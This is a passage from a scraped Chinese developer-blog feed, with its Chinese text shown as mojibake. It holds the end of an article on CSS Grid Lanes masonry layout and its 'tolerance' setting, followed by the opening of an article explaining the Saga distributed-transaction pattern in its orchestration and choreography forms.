  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}
</code></pre>
<p>å¦‚æœä½ æƒ³è¦åæ–¹å‘çš„ç –å—å¸ƒå±€ï¼Œä½¿ç”¨ <code>grid-template-rows</code>ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}
</code></pre>
<h2 data-id="heading-7">å®¹å·®</h2>
<p>â€œå®¹å·®â€æ˜¯ä¸º Grid Lanes åˆ›å»ºçš„ä¸€ä¸ªæ–°æ¦‚å¿µã€‚å®ƒå…è®¸ä½ è°ƒæ•´å¸ƒå±€ç®—æ³•åœ¨å†³å®šæ”¾ç½®é¡¹ç›®ä½ç½®æ—¶çš„ç²¾ç¡®åº¦ã€‚</p>
<p>å›åˆ°é«˜é€Ÿå…¬è·¯çš„æ¯”å–»ï¼š</p>
<p>å‡è®¾ 1 å·è½¦é“å‰é¢çš„è½¦æ¯” 2 å·è½¦é“é•¿äº† 1 å˜ç±³ï¼Œä¸‹ä¸€è¾†è½¦è¦æ’åˆ°å“ªæ¡è½¦é“ï¼Ÿ</p>
<p>å¦‚æœä¸¥æ ¼æŒ‰â€œå“ªæ¡çŸ­é€‰å“ªæ¡â€ï¼Œå®ƒä¼šé€‰ 2 å·è½¦é“ã€‚ä½† 1 å˜ç±³çš„å·®è·æ ¹æœ¬ä¸é‡è¦ï¼è¿™æ ·æ¥å›åˆ‡æ¢è½¦é“åè€Œè®©äººå›°æƒ‘ã€‚</p>
<p><strong>â€œå®¹å·®â€å°±æ˜¯å‘Šè¯‰ç³»ç»Ÿï¼šâ€œå·®è·å°äºè¿™ä¸ªå€¼ï¼Œå°±å½“ä½œä¸€æ ·é•¿â€ã€‚</strong></p>
<p>å®¹å·®é»˜è®¤å€¼æ˜¯ 1emï¼ˆå¤§çº¦ä¸€ä¸ªå­—çš„é«˜åº¦ï¼‰ã€‚</p>
<p>ä¸ºä»€ä¹ˆå®¹å·®å¾ˆé‡è¦å‘¢ï¼Ÿ</p>
<p><strong>å› ä¸ºç”¨é”®ç›˜ Tab é”®æµè§ˆç½‘é¡µçš„äººï¼ˆæ¯”å¦‚è§†éšœç”¨æˆ·ï¼‰ä¼šæŒ‰å†…å®¹é¡ºåºè·³è½¬ã€‚</strong></p>
<p>å¦‚æœå¸ƒå±€ä¹±è·³ï¼Œä»–ä»¬ä¼šå¾ˆè¿·æƒ‘ã€‚åˆé€‚çš„å®¹å·®èƒ½è®©æµè§ˆä½“éªŒæ›´æµç•…ã€‚</p>
<h2 data-id="heading-8">ç°åœ¨èƒ½ç”¨å—ï¼Ÿ</h2>
<p>ç›®å‰å¯ä»¥åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fsafari%2Fresources%2F" target="_blank" title="https://developer.apple.com/safari/resources/" ref="nofollow noopener noreferrer">Safari æŠ€æœ¯é¢„è§ˆç‰ˆ 234</a> ä¸­ä½“éªŒï¼Œå…¶ä»–æµè§ˆå™¨è¿˜åœ¨å¼€å‘ä¸­ã€‚</p>
<p>è‹¹æœ WebKit å›¢é˜Ÿä» 2022 å¹´ä¸­å°±å¼€å§‹å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œç°åœ¨åŸºæœ¬è¯­æ³•å·²ç»ç¨³å®šäº†ã€‚è™½ç„¶è¿˜æœ‰äº›ç»†èŠ‚åœ¨è®¨è®ºï¼ˆæ¯”å¦‚å±æ€§å‘½åï¼‰ï¼Œä½†æ ¸å¿ƒç”¨æ³•ä¸ä¼šå˜ã€‚</p>
<p>ä½ å¯ä»¥è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fwebkit.org%2Fdemos%2Fgrid3%2F" target="_blank" title="https://webkit.org/demos/grid3/" ref="nofollow noopener noreferrer">webkit.org/demos/grid3</a> çœ‹å„ç§å®é™…ä¾‹å­ã€‚</p>
<h2 data-id="heading-9">æœ€å</h2>
<p>æ¬¢è¿å›´è§‚æˆ‘çš„â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">ç½‘é¡µç‰ˆæœ‹å‹åœˆ</a>â€ï¼Œå…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>å†´ç¾½ï¼ˆæˆ–æœç´¢ yayujsï¼‰</strong>ï¼Œæ¯å¤©åˆ†äº«å‰ç«¯çŸ¥è¯†ã€AI å¹²è´§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Saga åˆ†å¸ƒå¼äº‹åŠ¡æ¨¡å¼è¯¦è§£]]></title>    <link>https://juejin.cn/post/7592765004807946291</link>    <guid>https://juejin.cn/post/7592765004807946291</guid>    <pubDate>2026-01-08T09:40:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592765004807946291" data-draft-id="7592816646870122505" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Saga åˆ†å¸ƒå¼äº‹åŠ¡æ¨¡å¼è¯¦è§£"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-08T09:40:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‹¼çˆ·"/> <meta itemprop="url" content="https://juejin.cn/user/2418581314208279"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Saga åˆ†å¸ƒå¼äº‹åŠ¡æ¨¡å¼è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2418581314208279/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‹¼çˆ·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:40:55.000Z" title="Thu Jan 08 2026 09:40:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="srcery">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1b19;color:#fce8c3}.hljs-emphasis,.hljs-strong{color:#918175}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#ff5c8f}.hljs-code,.hljs-selector-class{color:#68a8e4}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#ef2f27}.hljs-name,.hljs-title{color:#fbb829}.hljs-params,.hljs-type{color:#0aaeb3}.hljs-string{color:#98bc37}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable{color:#c07abe}.hljs-comment,.hljs-deletion,.hljs-meta{color:#918175}</style><blockquote>
<p>å…ˆå–å£æ°´ï¼Œå†çœ‹ä¸€çœ¼åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œç„¶åä½ ä¼šå‘ç°ï¼š<strong>æ²¡æœ‰äº‹åŠ¡ï¼Œå¿ƒé‡Œæ²¡åº•ï¼›æœ‰äº†äº‹åŠ¡ï¼Œç³»ç»Ÿè¦å‘½ã€‚</strong></p>
</blockquote>
<p>ä½œä¸ºä¸€åå†™äº†å¾ˆå¤šå¹´ Java çš„è€å…µï¼Œä»Šå¤©æˆ‘ä»¬æ¥èŠä¸€ä¸ªåœ¨å¾®æœåŠ¡ä¸–ç•Œé‡Œ<strong>æ—¢ä¸å®Œç¾ã€ä½†å¾ˆå®ç”¨</strong>çš„æ–¹æ¡ˆâ€”â€”<strong>Saga åˆ†å¸ƒå¼äº‹åŠ¡æ¨¡å¼</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆéœ€è¦ Sagaï¼Ÿï¼ˆé—®é¢˜ä»å“ªæ¥ï¼‰</h2>
<p>åœ¨å•ä½“åº”ç”¨é‡Œï¼Œäº‹åŠ¡æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-text" lang="text">BEGIN
  A è¡¨æ‰£é’±
  B è¡¨åŠ åº“å­˜
  C è¡¨åˆ›å»ºè®¢å•
COMMIT / ROLLBACK
</code></pre>
<p>ä¸€åˆ‡éƒ½å¾ˆç¾ï¼Œç›´åˆ°ï¼š</p>
<ul>
<li>æœåŠ¡è¢«æ‹†æˆäº† <strong>å¾®æœåŠ¡</strong></li>
<li>æ•°æ®åº“è¢«æ‹†æˆäº† <strong>å¤šä¸ªåº“</strong></li>
<li>æœ¬åœ°äº‹åŠ¡å¤±æ•ˆäº†</li>
</ul>
<p>ä½ ä¼šå‘ç°ï¼š</p>
<blockquote>
<p><strong>åˆ†å¸ƒå¼ç³»ç»Ÿé‡Œï¼Œæ²¡æœ‰ä¸€ä¸ªâ€œå…¨å±€æ•°æ®åº“äº‹åŠ¡â€åœ¨ç­‰ä½ ã€‚</strong></p>
</blockquote>
<h3 data-id="heading-1">ä¼ ç»Ÿæ–¹æ¡ˆçš„é—®é¢˜</h3>
<ul>
<li>
<p><strong>2PC / XA</strong>ï¼š</p>
<ul>
<li>å¼ºä¸€è‡´</li>
<li>å¼ºä¾èµ–</li>
<li>å¼ºæ€§èƒ½æ€æ‰‹</li>
</ul>
</li>
</ul>
<p>äºæ˜¯æˆ‘ä»¬å¼€å§‹æ€è€ƒï¼š</p>
<blockquote>
<p>èƒ½ä¸èƒ½<strong>ä¸è¦å¼ºä¸€è‡´</strong>ï¼Œä½†ç³»ç»Ÿè¿˜èƒ½è·‘ï¼Ÿ</p>
</blockquote>
<p>ç­”æ¡ˆå°±æ˜¯ï¼š<strong>Saga</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-2">äºŒã€Saga æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆä¸€å¥è¯ç‰ˆæœ¬ï¼‰</h2>
<blockquote>
<p><strong>Saga = ä¸€è¿ä¸²æœ¬åœ°äº‹åŠ¡ + å¯¹åº”çš„è¡¥å¿äº‹åŠ¡</strong></p>
</blockquote>
<p>æ¢å¥è¯è¯´ï¼š</p>
<ul>
<li>æ¯ä¸€æ­¥éƒ½ <strong>å…ˆæäº¤</strong></li>
<li>å¦‚æœåé¢å¤±è´¥äº†</li>
<li>å°± <strong>æŒ‰ç›¸åé¡ºåºè¡¥å¿å›å»</strong></li>
</ul>
<p>å¬èµ·æ¥æ˜¯ä¸æ˜¯æœ‰ç‚¹åƒï¼š</p>
<blockquote>
<p>â€œåšé”™äº†äº‹ï¼Œé åæ‚”è¯è§£å†³ã€‚â€</p>
</blockquote>
<p>æ²¡é”™ï¼Œä½†è¿™è¯åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿé‡Œï¼Œ<strong>å¾ˆå€¼é’±</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€Saga çš„æ ¸å¿ƒæ€æƒ³ï¼ˆé‡è¦ä½†ä¸å¤æ‚ï¼‰</h2>
<h3 data-id="heading-4">1ï¸âƒ£ æœ¬åœ°äº‹åŠ¡ä¼˜å…ˆ</h3>
<p>æ¯ä¸ªæœåŠ¡ï¼š</p>
<ul>
<li>åªæ“ä½œ <strong>è‡ªå·±çš„æ•°æ®åº“</strong></li>
<li>ä½¿ç”¨ <strong>æœ¬åœ°äº‹åŠ¡</strong>ï¼ˆSpring @Transactional é‚£å¥—ï¼‰</li>
</ul>
<h3 data-id="heading-5">2ï¸âƒ£ å¤±è´¥ â‰  å›æ»š</h3>
<p>Saga çš„ä¸–ç•Œé‡Œï¼š</p>
<ul>
<li><strong>å¤±è´¥ä¸æ˜¯ rollback</strong></li>
<li>è€Œæ˜¯ï¼š</li>
</ul>
<blockquote>
<p><strong>æ‰§è¡Œè¡¥å¿æ“ä½œï¼ˆCompensation Actionï¼‰</strong></p>
</blockquote>
<h3 data-id="heading-6">3ï¸âƒ£ æœ€ç»ˆä¸€è‡´æ€§</h3>
<ul>
<li>ä¸­é—´çŠ¶æ€å¯èƒ½ä¸ä¸€è‡´</li>
<li>ä½†æœ€ç»ˆèƒ½â€œå¯¹ä¸Šè´¦â€</li>
</ul>
<p>ä¸€å¥è¯æ€»ç»“ï¼š</p>
<blockquote>
<p><strong>Saga ä¸ä¿è¯ä½ æ—¶æ—¶å¼€å¿ƒï¼Œä½†ä¿è¯ä½ æœ€åä¸å´©ã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-7">å››ã€Saga çš„ä¸¤ç§ç»å…¸å®ç°æ–¹å¼</h2>
<h3 data-id="heading-8">æ–¹å¼ä¸€ï¼šç¼–æ’å¼ Sagaï¼ˆOrchestrationï¼‰â­ æ¨è</h3>
<p>æœ‰ä¸€ä¸ª<strong>æŒ‡æŒ¥å®˜</strong>ï¼Œç»Ÿä¸€è°ƒåº¦æµç¨‹ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant SagaCoordinator
    participant OrderService
    participant PaymentService
    participant InventoryService

    SagaCoordinator-&gt;&gt;OrderService: åˆ›å»ºè®¢å•
    SagaCoordinator-&gt;&gt;PaymentService: æ‰£æ¬¾
    SagaCoordinator-&gt;&gt;InventoryService: æ‰£åº“å­˜

    InventoryService--&gt;&gt;SagaCoordinator: å¤±è´¥
    SagaCoordinator-&gt;&gt;PaymentService: é€€æ¬¾ï¼ˆè¡¥å¿ï¼‰
    SagaCoordinator-&gt;&gt;OrderService: å–æ¶ˆè®¢å•ï¼ˆè¡¥å¿ï¼‰
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>æµç¨‹æ¸…æ™°</li>
<li>æ˜“äºç›‘æ§</li>
<li>é€»è¾‘é›†ä¸­</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>æŒ‡æŒ¥å®˜å¯èƒ½å˜èƒ–</li>
</ul>
<blockquote>
<p>ä½†å¯¹ Java åç«¯æ¥è¯´ï¼Œè¿™ä¸ªâ€œèƒ–â€æ˜¯å¯ä»¥æ¥å—çš„ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">æ–¹å¼äºŒï¼šç¼–èˆå¼ Sagaï¼ˆChoreographyï¼‰</h3>
<p>æ²¡æœ‰æŒ‡æŒ¥å®˜ï¼Œå…¨é æœåŠ¡è‡ªå·±â€œçœ‹æ¶ˆæ¯åŠäº‹â€ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
  Order --&gt;|äº‹ä»¶| Payment
  Payment --&gt;|äº‹ä»¶| Inventory
  Inventory --&gt;|å¤±è´¥äº‹ä»¶| Payment
  Payment --&gt;|è¡¥å¿äº‹ä»¶| Order
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>å»ä¸­å¿ƒåŒ–</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>é“¾è·¯éš¾è¿½è¸ª</li>
<li>Debug é ä¿¡ä»°</li>
</ul>
<blockquote>
<p><strong>ä¸€æ—¦ç³»ç»Ÿå¤§äº†ï¼Œæ²¡äººçŸ¥é“è°åœ¨è·³å“ªæ”¯èˆã€‚</strong></p>
</blockquote>
<hr/>
